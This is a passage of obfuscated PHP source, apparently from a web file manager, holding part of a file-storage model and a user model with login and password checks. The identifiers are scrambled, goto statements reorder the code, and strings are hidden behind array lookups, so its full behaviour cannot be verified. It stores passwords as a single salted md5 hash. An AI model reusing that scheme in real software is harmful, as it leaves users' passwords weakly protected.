$bøÁ¥¬ƒÓÊ, $aĞÄšáÕ[2176] => $C¸Î¸´Äµ¾, $aĞÄšáÕ[2177] => $DÌ•Ë…‹è); return $f¹§¢­§ö³; goto BõâáµŠ¾¯; E‰˜í¿—: $C§º´ßƒ¨é = get_path_this($bøÁ¥¬ƒÓÊ); if ($fÛŞ’Ùã­£) { $C§¶ ÷ğÂÎ = IO::move($A°ƒ÷‡Û®Ö, $AÊÁÇÔ‘÷ª, !1, $C§º´ßƒ¨é); } else { $C§¶ ÷ğÂÎ = IO::copy($A°ƒ÷‡Û®Ö, $AÊÁÇÔ‘÷ª, !1, $C§º´ßƒ¨é); } if (!$C§¶ ÷ğÂÎ) { return !1; } goto F†‘çÄÄ‹; dØè¨Ï­„: $aĞÄšáÕ =& $_SERVER[…Ò×–]; $bøÁ¥¬ƒÓÊ = $this->createFileName($eÌğ–„İ); $AÊÁÇÔ‘÷ª = get_path_father($bøÁ¥¬ƒÓÊ); goto E‰˜í¿—; BõâáµŠ¾¯: } public function addFileCheckExist($eÃà©å†˜, $D¨ËÚùÒôÂ, $Eœš±œÄµ‘) { $d¿¥…òª°ï =& $_SERVER[…Ò×–]; $dÉ„“ĞãÔÇ = $this->findByHash($eÃà©å†˜, $D¨ËÚùÒôÂ); if (!$dÉ„“ĞãÔÇ) { return !1; } $fƒ«½Ù¶¨¹ = array($d¿¥…òª°ï[2175] => intval($dÉ„“ĞãÔÇ[$d¿¥…òª°ï[2179]]) + 1, $d¿¥…òª°ï[525] => $Eœš±œÄµ‘); $this->where(array($d¿¥…òª°ï[424] => $dÉ„“ĞãÔÇ[$d¿¥…òª°ï[423]]))->save($fƒ«½Ù¶¨¹); return $dÉ„“ĞãÔÇ; } public function remove($C—İ¶†¬‘Ä) { $this->linkCountChange($C—İ¶†¬‘Ä, !1); $this->clearEmpty(); return !0; } public function linkAdd($Bó¼ÏÃ„Â‘) { $this->linkCountChange($Bó¼ÏÃ„Â‘, !0); } public function linkCountChange($f±£ñ¡ÓÌ, $AåØÒÈé°) { goto FÚÇåçëƒ; C»˜ÍÒÁŠ: foreach ($fÑ­‘¹¾§” as $FŒ°›Œ‹Ï¼ => $b¡êÛ„øŒ¦) { $c¶À·õğªÎ = $b¡êÛ„øŒ¦ . $C—½…¢ÎÈ¿[33]; if (!$aŠŠÊŞÜ£[$c¶À·õğªÎ]) { $aŠŠÊŞÜ£[$c¶À·õğªÎ] = array(); } $aŠŠÊŞÜ£[$c¶À·õğªÎ][] = $FŒ°›Œ‹Ï¼; } foreach ($aŠŠÊŞÜ£ as $b¡êÛ„øŒ¦ => $BÎîˆ’ÓÕÜ) { if (!$BÎîˆ’ÓÕÜ) { continue; } $b¡êÛ„øŒ¦ = $AåØÒÈé° ? $b¡êÛ„øŒ¦ : -intval($b¡êÛ„øŒ¦); $F¤†ŞØñÃÉ = array($C—½…¢ÎÈ¿[423] => array($C—½…¢ÎÈ¿[7], $BÎîˆ’ÓÕÜ)); if ($b¡êÛ„øŒ¦ < 0) { $F¤†ŞØñÃÉ[$C—½…¢ÎÈ¿[2179]] = array($C—½…¢ÎÈ¿[935], abs($b¡êÛ„øŒ¦)); } $this->where($F¤†ŞØñÃÉ)->setAdd($C—½…¢ÎÈ¿[2179], $b¡êÛ„øŒ¦); } goto e´ÎµÚ½Ó®; b’‘Î§ø¨î: $fÑ­‘¹¾§” = array(); foreach ($f±£ñ¡ÓÌ as $FŒ°›Œ‹Ï¼) { $c¶À·õğªÎ = $FŒ°›Œ‹Ï¼ . $C—½…¢ÎÈ¿[33]; if (!$fÑ­‘¹¾§”[$c¶À·õğªÎ]) { $fÑ­‘¹¾§”[$c¶À·õğªÎ] = 0; } $fÑ­‘¹¾§”[$c¶À·õğªÎ]++; } $aŠŠÊŞÜ£ = array(); goto C»˜ÍÒÁŠ; FÚÇåçëƒ: $C—½…¢ÎÈ¿ =& $_SERVER[…Ò×–]; if (!$f±£ñ¡ÓÌ) { return; } if (!is_array($f±£ñ¡ÓÌ)) { $f±£ñ¡ÓÌ = array($f±£ñ¡ÓÌ); } goto b’‘Î§ø¨î; e´ÎµÚ½Ó®: } public function findByHash($CªòˆÑ³†÷, $F§ñ¦‚Úâ¥ = false) { $Aìè•ÔèÄ =& $_SERVER[…Ò×–]; if (!$CªòˆÑ³†÷ && !$F§ñ¦‚Úâ¥) { return !1; } $A¤‡í…Œ’× = array($Aìè•ÔèÄ[2176] => $CªòˆÑ³†÷); if ($F§ñ¦‚Úâ¥) { $A¤‡í…Œ’× = array($Aìè•ÔèÄ[2177] => $F§ñ¦‚Úâ¥); } return $this->order($Aìè•ÔèÄ[2180])->where($A¤‡í…Œ’×)->find(); } public function clearEmpty($EÊÕõ×ğ†Ğ = 0) { goto EËÀÌ¨º­¦; Dš¨„¨œëÇ: $CŠÄÆÑ®ñ = $this->where($c¿»¨Ø·ì°)->select(); if (!$CŠÄÆÑ®ñ) { return; } $Cøßµ™„¥‚ = new Task($D†±„½‰Ñ½[2182], $D†±„½‰Ñ½[33], count($CŠÄÆÑ®ñ)); goto Cµ—¨‚¼²¿; Cµ—¨‚¼²¿: foreach ($CŠÄÆÑ®ñ as $F‰ÜÀÎÆ¬Ù) { $Cøßµ™„¥‚->update(1); $this->resetFile($F‰ÜÀÎÆ¬Ù); } $Cøßµ™„¥‚->end(); goto c¹»Ãì•©Á; EËÀÌ¨º­¦: $D†±„½‰Ñ½ =& $_SERVER[…Ò×–]; $CÁŒ ÂëÌ = time() - 3600 * 24 * $EÊÕõ×ğ†Ğ; $c¿»¨Ø·ì° = $D†±„½‰Ñ½[2181] . $CÁŒ ÂëÌ; goto Dš¨„¨œëÇ; c¹»Ãì•©Á: } public function resetFile($cÀ–¡âå÷¦) { goto F’›æî•ò•; fä¼ÈØ²: $c‰œ¬ŠøËø = Model($E÷­ğŸÙàà[2183])->where($f¹ªÀ¹òÒÁ)->count(); $e¡ïœ÷Ãõ¦ = intval($a®ö¬æ’ÒŒ) + intval($c‰œ¬ŠøËø); if ($e¡ïœ÷Ãõ¦ == 0) { IO::remove($cÀ–¡âå÷¦[$E÷­ğŸÙàà[75]]); $this->where($f¹ªÀ¹òÒÁ)->delete(); $this->metaSet($cÀ–¡âå÷¦[$E÷­ğŸÙàà[423]], null, null); return; } goto cÓ–œàÌ—à; F’›æî•ò•: $E÷­ğŸÙàà =& $_SERVER[…Ò×–]; $f¹ªÀ¹òÒÁ = array($E÷­ğŸÙàà[424] => $cÀ–¡âå÷¦[$E÷­ğŸÙàà[423]]); $a®ö¬æ’ÒŒ = Model($E÷­ğŸÙàà[1127])->where($f¹ªÀ¹òÒÁ)->count(); goto fä¼ÈØ²; cÓ–œàÌ—à: if ($cÀ–¡âå÷¦[$E÷­ğŸÙàà[2179]] != $e¡ïœ÷Ãõ¦) { $this->where($f¹ªÀ¹òÒÁ)->save(array($E÷­ğŸÙàà[2175] => $e¡ïœ÷Ãõ¦)); } goto fèğ¹ò‹‡; fèğ¹ò‹‡: } public function storageInfo($bˆëÛá¶—¬ = false) { goto bñ®ºšƒ½Ü; d‚Şéœõ÷: $AÊœ‡‹·£ = 1; $B°ÇöÊÃæò = 0; $fò»•Î”± = 5000; goto AÁÔ’¨¼§å; AÁÔ’¨¼§å: for ($D¦Ù½Ê£Äë = 0; $D¦Ù½Ê£Äë < $F‰•¯œÀ¸ê; $D¦Ù½Ê£Äë = $D¦Ù½Ê£Äë + $fò»•Î”±) { $aÈö™ùÌÂö = $this->limit($D¦Ù½Ê£Äë, $D¦Ù½Ê£Äë + $fò»•Î”±)->select(); foreach ($aÈö™ùÌÂö as $eåÒ¯´Ä•‰) { $AÊœ‡‹·£ += $eåÒ¯´Ä•‰[$f»š ©Û°¨[77]] * $eåÒ¯´Ä•‰[$f»š ©Û°¨[2179]]; $e­àï”ë”¤ += $eåÒ¯´Ä•‰[$f»š ©Û°¨[77]] * ($eåÒ¯´Ä•‰[$f»š ©Û°¨[2179]] - 1); $B°ÇöÊÃæò += $eåÒ¯´Ä•‰[$f»š ©Û°¨[2179]]; } } $cø¤òÊ“‰ = array($f»š ©Û°¨[2184] => $AÊœ‡‹·£, $f»š ©Û°¨[2185] => $e­àï”ë”¤, $f»š ©Û°¨[2186] => $e­àï”ë”¤ / $AÊœ‡‹·£, $f»š ©Û°¨[81] => $F‰•¯œÀ¸ê, $f»š ©Û°¨[2187] => $B°ÇöÊÃæò); return $cø¤òÊ“‰; goto a“Ç›«šŒ; bñ®ºšƒ½Ü: $f»š ©Û°¨ =& $_SERVER[…Ò×–]; $F‰•¯œÀ¸ê = $this->count() + 0.0; $e­àï”ë”¤ = 0; goto d‚Şéœõ÷; a“Ç›«šŒ: } } goto c”‰Æ§Îôì; aØ™‹²†²ë: class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\x6d\145" => "\x75\x73\x65\162\x5f\155\x65\164\141", "\155\145\164\141\x46\x69\145\x6c\x64" => "\x75\163\145\162\111\104"); protected $simpleField = "\165\x73\145\x72\x49\x44\x2c\156\151\143\x6b\116\141\155\x65\x2c\156\141\155\145\54\141\x76\x61\164\141\162\x2c\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($fÉÙç’¹©) { $Dƒ¿Ş¾í³» =& $_SERVER[…Ò×–]; $eì¨÷£š¹« = $Dƒ¿Ş¾í³»[2531]; return array($Dƒ¿Ş¾í³»[2188] => array($fÉÙç’¹©[0], $eì¨÷£š¹«), $Dƒ¿Ş¾í³»[2190] => array($fÉÙç’¹©[0], $eì¨÷£š¹«), $Dƒ¿Ş¾í³»[2532] => array($fÉÙç’¹©[0], $eì¨÷£š¹«)); } protected function getInfo($B×ˆŠƒë†, $B²ö’Ñ›æÇ = false) { $b½Ï õ†‰¨ = $this->getInfoSimple($B×ˆŠƒë†); if (!is_array($b½Ï õ†‰¨)) { return array(); } if ($B²ö’Ñ›æÇ) { return $this->_getInfoApply($b½Ï õ†‰¨); } return $this->cacheFunctionGet($_SERVER[…Ò×–][2244], $B×ˆŠƒë†); } protected function getInfoFull($cÍªŠùó, $cŠçîàéÃ” = false) { $A¨è¡ª„í´ = $this->getInfoSimple($cÍªŠùó); if (!is_array($A¨è¡ª„í´)) { return array(); } if ($cŠçîàéÃ”) { return $this->_getInfoApply($A¨è¡ª„í´, !0); return $this->_getInfoApply($A¨è¡ª„í´, !0); } return $this->cacheFunctionGet($_SERVER[…Ò×–][2533], $cÍªŠùó); } private function _getInfoApply($A¤ ˆ¿ÓÖ, $e÷¿ÖØ›‘Ø = false) { goto Eô•è’É©¡; Dî‹‡ğØ¯±: $A¤ ˆ¿ÓÖ = $this->_listDataApplyItem($A¤ ˆ¿ÓÖ); $Aõ‡‹ô¹à‰ = Model($b©•à§ÃÓö[1127])->metaGet($A¤ ˆ¿ÓÖ[$b©•à§ÃÓö[395]][$b©•à§ÃÓö[373]]); $A¤ ˆ¿ÓÖ[$b©•à§ÃÓö[2536]] = $DÎßÏÁ‘‰²; goto DÒ­¬‹½²ù; Eô•è’É©¡: $b©•à§ÃÓö =& $_SERVER[…Ò×–]; if (!$A¤ ˆ¿ÓÖ) { return $A¤ ˆ¿ÓÖ; } $DÎßÏÁ‘‰² = md5($b©•à§ÃÓö[2534] . $A¤ ˆ¿ÓÖ[$b©•à§ÃÓö[811]] . $b©•à§ÃÓö[2535] . $A¤ ˆ¿ÓÖ[$b©•à§ÃÓö[28]]); goto Dî‹‡ğØ¯±; DÒ­¬‹½²ù: $A¤ ˆ¿ÓÖ[$b©•à§ÃÓö[395]][$b©•à§ÃÓö[2373]] = isset($Aõ‡‹ô¹à‰[$b©•à§ÃÓö[2374]]) ? $Aõ‡‹ô¹à‰[$b©•à§ÃÓö[2374]] : null; if ($e÷¿ÖØ›‘Ø) { $A¤ ˆ¿ÓÖ[$b©•à§ÃÓö[421]] = $this->metaGet($A¤ ˆ¿ÓÖ[$b©•à§ÃÓö[1450]]); } return $A¤ ˆ¿ÓÖ; goto bØ­Ğ¤Ë¦; bØ­Ğ¤Ë¦: } protected function getInfoSimple($FÏƒ¼±¯–Ô, $dò¨Àæ…ã = false) { $aÁ™¤äõ™Ô =& $_SERVER[…Ò×–]; if (!$FÏƒ¼±¯–Ô) { return array(); } if ($dò¨Àæ…ã) { $BîÛÑ„ƒ¾í = $this->where(array($aÁ™¤äõ™Ô[1450] => intval($FÏƒ¼±¯–Ô)))->find(); if (!is_array($BîÛÑ„ƒ¾í)) { return array(); } $BîÛÑ„ƒ¾í[$aÁ™¤äõ™Ô[2537]] = Action($aÁ™¤äõ™Ô[2538])->parseUrl($BîÛÑ„ƒ¾í[$aÁ™¤äõ™Ô[2537]]); return $BîÛÑ„ƒ¾í; } return $this->cacheFunctionGet($aÁ™¤äõ™Ô[2191], $FÏƒ¼±¯–Ô); } protected function getInfoSimpleOuter($E“ÍšñËƒ) { goto d¹¶×‹“¥ë; FÕÍïÛñ‡•: $CåÄäÕª­© = array_field_key($F‡Îáí®¹”, explode($Bºø…Ø–äÀ[47], $this->simpleField)); if (!$CåÄäÕª­©) { return array($Bºø…Ø–äÀ[1450] => $Bºø…Ø–äÀ[1042], $Bºø…Ø–äÀ[28] => $Bºø…Ø–äÀ[157] . LNG($Bºø…Ø–äÀ[2541]) . $Bºø…Ø–äÀ[481], $Bºø…Ø–äÀ[2537] => STATIC_PATH . $Bºø…Ø–äÀ[2542]); } $CåÄäÕª­©[$Bºø…Ø–äÀ[2537]] = Action($Bºø…Ø–äÀ[2538])->parseUrl($CåÄäÕª­©[$Bºø…Ø–äÀ[2537]]); goto AñÍÚ¨Üƒ; AñÍÚ¨Üƒ: return $CåÄäÕª­©; goto aõ‹«Ùƒ£; d¹¶×‹“¥ë: $Bºø…Ø–äÀ =& $_SERVER[…Ò×–]; if (!$E“ÍšñËƒ || $E“ÍšñËƒ == 0) { return array($Bºø…Ø–äÀ[1450] => $Bºø…Ø–äÀ[473], $Bºø…Ø–äÀ[28] => $Bºø…Ø–äÀ[157] . LNG($Bºø…Ø–äÀ[2539]) . $Bºø…Ø–äÀ[481], $Bºø…Ø–äÀ[2537] => STATIC_PATH . $Bºø…Ø–äÀ[2540]); } $F‡Îáí®¹” = $this->cacheFunctionGet($Bºø…Ø–äÀ[2191], $E“ÍšñËƒ); goto FÕÍïÛñ‡•; aõ‹«Ùƒ£: } protected function groupUser($A³ë–«°¸) { } public static function errorLang($eµ™”ÌËŸ) { $Cğó¼¾Âïº =& $_SERVER[…Ò×–]; $F¢£ßŒ‰Š¿ = array(self::ERROR_USER_NOT_EXISTS => $Cğó¼¾Âïº[2543], self::ERROR_USER_PASSWORD_ERROR => $Cğó¼¾Âïº[2544], self::ERROR_USER_EXIST_NAME => $Cğó¼¾Âïº[2545], self::ERROR_USER_EXIST_PHONE => $Cğó¼¾Âïº[2546], self::ERROR_USER_EXIST_EMAIL => $Cğó¼¾Âïº[2547], self::ERROR_USER_LOGIN_LOCK => $Cğó¼¾Âïº[2548], self::ERROR_IP_NOT_ALLOW => $Cğó¼¾Âïº[2549], self::ERROR_USER_EXIST_NICKNAME => $Cğó¼¾Âïº[2550]); return LNG($F¢£ßŒ‰Š¿[$eµ™”ÌËŸ]); } public function getInfoByMeta($CŒ£›ÌÚ, $b˜ß©…Ú‘¿) { $fòÀ…«˜Ã‡ =& $_SERVER[…Ò×–]; $Bøİˆ˜‰¨ö = Model($fòÀ…«˜Ã‡[2551])->where(array($fòÀ…«˜Ã‡[89] => $CŒ£›ÌÚ, $fòÀ…«˜Ã‡[363] => $b˜ß©…Ú‘¿))->find(); if ($Bøİˆ˜‰¨ö) { return $this->getInfo($Bøİˆ˜‰¨ö[$fòÀ…«˜Ã‡[1450]]); } return !1; } public function userLoginCheck($A¥ÛƒÕ‚èÏ, $D±İ§Ù›Ÿ°) { $dÀ‰—¬˜² =& $_SERVER[…Ò×–]; $F‹Ë¶ÖŸ»¾ = $this->userLoginFind($A¥ÛƒÕ‚èÏ); if (!$F‹Ë¶ÖŸ»¾) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($F‹Ë¶ÖŸ»¾[$dÀ‰—¬˜²[1450]], $D±İ§Ù›Ÿ°)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } $this->userEdit($F‹Ë¶ÖŸ»¾[$dÀ‰—¬˜²[1450]], array($dÀ‰—¬˜²[2552] => time())); return $this->getInfo($F‹Ë¶ÖŸ»¾[$dÀ‰—¬˜²[1450]]); } public function userLoginFind($D¼¥¨Æğ»œ) { $c‹„‰ß’Ïâ =& $_SERVER[…Ò×–]; $dßõëèŒµ = array($c‹„‰ß’Ïâ[28] => $D¼¥¨Æğ»œ, $c‹„‰ß’Ïâ[2377] => $D¼¥¨Æğ»œ, $c‹„‰ß’Ïâ[297] => $D¼¥¨Æğ»œ, $c‹„‰ß’Ïâ[2553] => $D¼¥¨Æğ»œ, $c‹„‰ß’Ïâ[920] => $c‹„‰ß’Ïâ[922]); if ($this->nickNameRpt()) { unset($dßõëèŒµ[$c‹„‰ß’Ïâ[2377]]); } return $this->where($dßõëèŒµ)->find(); } public function clearCache($b©™‚ÀŠ¯ª) { $c–ä“è¬Î =& $_SERVER[…Ò×–]; $this->cacheFunctionClear($c–ä“è¬Î[2244], $b©™‚ÀŠ¯ª); $this->cacheFunctionClear($c–ä“è¬Î[2191], $b©™‚ÀŠ¯ª); $this->cacheFunctionClear($c–ä“è¬Î[2533], $b©™‚ÀŠ¯ª); } public function userPasswordCheck($aŞì¹»¤ÈÃ, $BóÜÃ÷÷Ñ¾) { $D©¦Ş¯ÚÓ =& $_SERVER[…Ò×–]; $fÙØ±á… = $this->where(array($D©¦Ş¯ÚÓ[1450] => intval($aŞì¹»¤ÈÃ)))->find(); $FÈßêØ¬ğ– = $this->metaGet($aŞì¹»¤ÈÃ); $b’à«ğÄÛ« = isset($FÈßêØ¬ğ–[$D©¦Ş¯ÚÓ[2554]]) ? $FÈßêØ¬ğ–[$D©¦Ş¯ÚÓ[2554]] : $D©¦Ş¯ÚÓ[33]; if (md5($b’à«ğÄÛ« . trim($BóÜÃ÷÷Ñ¾)) !== $fÙØ±á…[$D©¦Ş¯ÚÓ[811]]) { return !1; } return !0; } public function userAdd($A£ë¸Ë‘õø) { goto F›·¼éö; F›·¼éö: $A‘µ‚‡ÇĞ‚ =& $_SERVER[…Ò×–]; $F¿¬Ò¦ªğÏ = array($A‘µ‚‡ÇĞ‚[390] => $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[28]], $A‘µ‚‡ÇĞ‚[2555] => $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[1333]], $A‘µ‚‡ÇĞ‚[2556] => isset($A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[297]]) ? $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[297]] : $A‘µ‚‡ÇĞ‚[33], $A‘µ‚‡ÇĞ‚[2557] => isset($A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[2553]]) ? $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[2553]] : $A‘µ‚‡ÇĞ‚[33], $A‘µ‚‡ÇĞ‚[2558] => isset($A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[2377]]) ? $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[2377]] : $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[28]], $A‘µ‚‡ÇĞ‚[2559] => isset($A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[2537]]) ? $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[2537]] : $A‘µ‚‡ÇĞ‚[33], $A‘µ‚‡ÇĞ‚[2560] => isset($A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[2561]]) ? $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[2561]] : 1, $A‘µ‚‡ÇĞ‚[2562] => $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[811]], $A‘µ‚‡ÇĞ‚[2192] => isset($A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[2103]]) ? $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[2103]] : 1024 * 1024 * 20, $A‘µ‚‡ÇĞ‚[2193] => 0, $A‘µ‚‡ÇĞ‚[2552] => 0, $A‘µ‚‡ÇĞ‚[2231] => isset($A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[694]]) ? $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[694]] : 1); if (!empty($A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[1450]])) { $F¿¬Ò¦ªğÏ[$A‘µ‚‡ÇĞ‚[1450]] = $A£ë¸Ë‘õø[$A‘µ‚‡ÇĞ‚[1450]]; } goto EÈ’¹–­¢; EÎÈ‡ö–¦¹: $cï‚…’œÕ = array($A‘µ‚‡ÇĞ‚[2562] => $F¿¬Ò¦ªğÏ[$A‘µ‚‡ÇĞ‚[811]], $A‘µ‚‡ÇĞ‚[2558] => $F¿¬Ò¦ªğÏ[$A‘µ‚‡ÇĞ‚[2377]]); $this->userEdit($F‚ˆİÒµö„, $cï‚…’œÕ); Model($A‘µ‚‡ÇĞ‚[1127])->userRootAdd($F‚ˆİÒµö„); goto FàéáÇ’Óì; FàéáÇ’Óì: return $F‚ˆİÒµö„; goto dÜµ¥Î—Ôµ; EÈ’¹–­¢: $F‡ë¦Í‹Ê = $this->_checkExist($A£ë¸Ë‘õø); if ($F‡ë¦Í‹Ê !== !0) { return $F‡ë¦Í‹Ê; } $F‚ˆİÒµö„ = $this->add($F¿¬Ò¦ªğÏ); goto EÎÈ‡ö–¦¹; dÜµ¥Î—Ôµ: } protected function userEditTest($DÀ„«øÖ¶Ô, $AòõÄµò‡) { return $this->call($_SERVER[…Ò×–][2563], $DÀ„«øÖ¶Ô, $AòõÄµò‡); } protected function userEdit($eã­ª¢åõ, $C•°ßğ£‚æ) { goto B®ŒºÙ‘ª; a‰§¿‡½ÔÀ: $this->where(array($B½¬²ÛŒ”»[1441] => $eã­ª¢åõ))->save($C•°ßğ£‚æ); if (isset($C•°ßğ£‚æ[$B½¬²ÛŒ”»[2377]])) { $this->setNamePinyin($eã­ª¢åõ, $C•°ßğ£‚æ[$B½¬²ÛŒ”»[2377]]); } $this->clearCache($eã­ª¢åõ); goto b×½îÎöè; B®ŒºÙ‘ª: $B½¬²ÛŒ”» =& $_SERVER[…Ò×–]; $F´¡Ÿôò  = $this->getInfoSimple($eã­ª¢åõ); if (!$F´¡Ÿôò ) { return !1; } goto C“Æï¡æ—ö; C“Æï¡æ—ö: $e¹ßĞê¥©Í = $this->_checkExist($C•°ßğ£‚æ, $eã­ª¢åõ); if ($e¹ßĞê¥©Í !== !0) { return $e¹ßĞê¥©Í; } if (isset($C•°ßğ£‚æ[$B½¬²ÛŒ”»[811]]) && trim($C•°ßğ£‚æ[$B½¬²ÛŒ”»[811]]) != $B½¬²ÛŒ”»[33]) { $EŒÒ©æÉìŠ = $this->metaGet($eã­ª¢åõ); if (empty($EŒÒ©æÉìŠ[$B½¬²ÛŒ”»[2554]])) { $EŒÒ©æÉìŠ[$B½¬²ÛŒ”»[2554]] = rand_string(10); Model($B½¬²ÛŒ”»[479])->metaSet($eã­ª¢åõ, $B½¬²ÛŒ”»[2554], $EŒÒ©æÉìŠ[$B½¬²ÛŒ”»[2554]]); } $C•°ßğ£‚æ[$B½¬²ÛŒ”»[811]] = md5($EŒÒ©æÉìŠ[$B½¬²ÛŒ”»[2554]] . trim($C•°ßğ£‚æ[$B½¬²ÛŒ”»[811]])); } else { unset($C•°ßğ£‚æ[$B½¬²ÛŒ”»[811]]); } goto a‰§¿‡½ÔÀ; b×½îÎöè: return !0; goto b¼îÍŠ¨Ì´; b¼îÍŠ¨Ì´: } public function setNamePinyin($C‡œÏ¯À³, $C•«à¥·× = false) { $E˜„ùÏ¡ =& $_SERVER[…Ò×–]; if (!$C•«à¥·×) { $CêÊ¼Äï„¿ = $this->getInfoSimple($C‡œÏ¯À³); $C•«à¥·× = $CêÊ¼Äï„¿[$E˜„ùÏ¡[2377]] ? $CêÊ¼Äï„¿[$E˜„ùÏ¡[2377]] : $CêÊ¼Äï„¿[$E˜„ùÏ¡[28]]; } $E£»°¯ å = Model($E˜„ùÏ¡[482]); if (!Input::check($C•«à¥·×, $E˜„ùÏ¡[533])) { return $E£»°¯ å->metaSet($C‡œÏ¯À³, array($E˜„ùÏ¡[420] => $E˜„ùÏ¡[33], $E˜„ùÏ¡[419] => $E˜„ùÏ¡[33])); } return $E£»°¯ å->metaSet($C‡œÏ¯À³, array($E˜„ùÏ¡[420] => str_replace($E˜„ùÏ¡[50], $E˜„ùÏ¡[33], Pinyin::encode($C•«à¥·×)), $E˜„ùÏ¡[419] => Pinyin::encode($C•«à¥·×, $E˜„ùÏ¡[534]))); } private function nickNameRpt() { $Aä£Ü½‰ŠÈ =& $_SERVER[…Ò×–]; $aöÛ§¸·˜ = Model($Aä£Ü½‰ŠÈ[1098])->get($Aä£Ü½‰ŠÈ[2564]); $B‚©¦‚Ôé” = $GLOBALS[$Aä£Ü½‰ŠÈ[6]][$Aä£Ü½‰ŠÈ[2522]][$Aä£Ü½‰ŠÈ[2564]]; $bÏØÍğÚâ = !is_null($aöÛ§¸·˜) ? $aöÛ§¸·˜ : $B‚©¦‚Ôé”; return !!$bÏØÍğÚâ; } private function _checkExist($D“óÇ¶ŠŒ–, $eËÔ£¸¦³Ò = false) { $f×Á„š†Ø =& $_SERVER[…Ò×–]; $aù¾êòãÑ¹ = array($f×Á„š†Ø[28] => UserModel::ERROR_USER_EXIST_NAME, $f×Á„š†Ø[2377] => UserModel::ERROR_USER_EXIST_NICKNAME, $f×Á„š†Ø[297] => UserModel::ERROR_USER_EXIST_EMAIL, $f×Á„š†Ø[2553] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($aù¾êòãÑ¹[$f×Á„š†Ø[2377]]); } $Aàì½Áæ¹ = $eËÔ£¸¦³Ò ? array($f×Á„š†Ø[1450] => array($f×Á„š†Ø[2565], $eËÔ£¸¦³Ò)) : array(); foreach ($aù¾êòãÑ¹ as $D³Ùƒ’ö¹– => $Cåâ‡‚ÖÅÄ) { $b„ÕÔ±âËŠ = array(); foreach ($aù¾êòãÑ¹ as $fàØ†Úô”¢ => $B¹×íŒÒ˜¯) { if (isset($D“óÇ¶ŠŒ–[$fàØ†Úô”¢]) && $D“óÇ¶ŠŒ–[$fàØ†Úô”¢]) { $b„ÕÔ±âËŠ[] = $D“óÇ¶ŠŒ–[$fàØ†Úô”¢]; } } if (!$b„ÕÔ±âËŠ) { continue; } $c£êŠ‘’Æ = array_merge(array($D³Ùƒ’ö¹– => array($f×Á„š†Ø[7], $b„ÕÔ±âËŠ)), $Aàì½Áæ¹); $Céó™à²Î = $this->where($c£êŠ‘’Æ)->find(); if ($Céó™à²Î) { return $Cåâ‡‚ÖÅÄ; } } return !0; } public function userListInfo($càèÆÕ æ) { $AÕ°êáòë =& $_SERVER[…Ò×–]; $E¬¡Ï«Ö¥ = array(); $càèÆÕ æ = is_array($càèÆÕ æ) ? array_unique($càèÆÕ æ) : array(); if (!$càèÆÕ æ) { return $E¬¡Ï«Ö¥; } if (count($càèÆÕ æ) < 20) { foreach ($càèÆÕ æ as $B’Ææ‚ˆñ) { $E¬¡Ï«Ö¥[$B’Ææ‚ˆñ . $AÕ°êáòë[33]] = $this->getInfoSimpleOuter($B’Ææ‚ˆñ); } } else { $Bå©‚¹´¨í = array($AÕ°êáòë[1441] => array($AÕ°êáòë[388], $càèÆÕ æ)); if (count($càèÆÕ æ) == 1) { $Bå©‚¹´¨í = array($AÕ°êáòë[1441] => $càèÆÕ æ[0]); } $a³©‘ÂÖñ = Model($AÕ°êáòë[479])->field($this->simpleField)->where($Bå©‚¹´¨í)->select(); $a³©‘ÂÖñ = array_to_keyvalue($a³©‘ÂÖñ, $AÕ°êáòë[1450]); foreach ($càèÆÕ æ as $B’Ææ‚ˆñ) { $C©½»’óÙÉ = $a³©‘ÂÖñ[$a³©‘ÂÖñ[$B’Ææ‚ˆñ]]; if (!$C©½»’óÙÉ) { $E¬¡Ï«Ö¥[$B’Ææ‚ˆñ . $AÕ°êáòë[33]] = $this->getInfoSimpleOuter($B’Ææ‚ˆñ); continue; } $C©½»’óÙÉ[$AÕ°êáòë[2537]] = Action($AÕ°êáòë[2538])->parseUrl($C©½»’óÙÉ[$AÕ°êáòë[2537]]); $E¬¡Ï«Ö¥[$B’Ææ‚ˆñ . $AÕ°êáòë[33]] = $C©½»’óÙÉ; } } return $E¬¡Ï«Ö¥; } protected function userStatus($AËÚåÁ, $d–Í¿äøÖ³) { $f™¹ô›È“ = $this->getInfoSimple($AËÚåÁ); if (!$f™¹ô›È“) { return !1; } $b”‚çç¾÷ã = array($_SERVER[…Ò×–][694] => $d–Í¿äøÖ³); return $this->userEdit($AËÚåÁ, $b”‚çç¾÷ã); } protected function userRemove($d®À¥Ûëøã) { goto f÷ÈÃ—„‡ß; B¡‚­Âå÷: Model($e…‡¸óñ»[757])->userRootRemove($d®À¥Ûëøã); return $this->where($C”á×¦‘¼)->delete(); goto cá÷ËÒËÅ¯; f÷ÈÃ—„‡ß: $e…‡¸óñ» =& 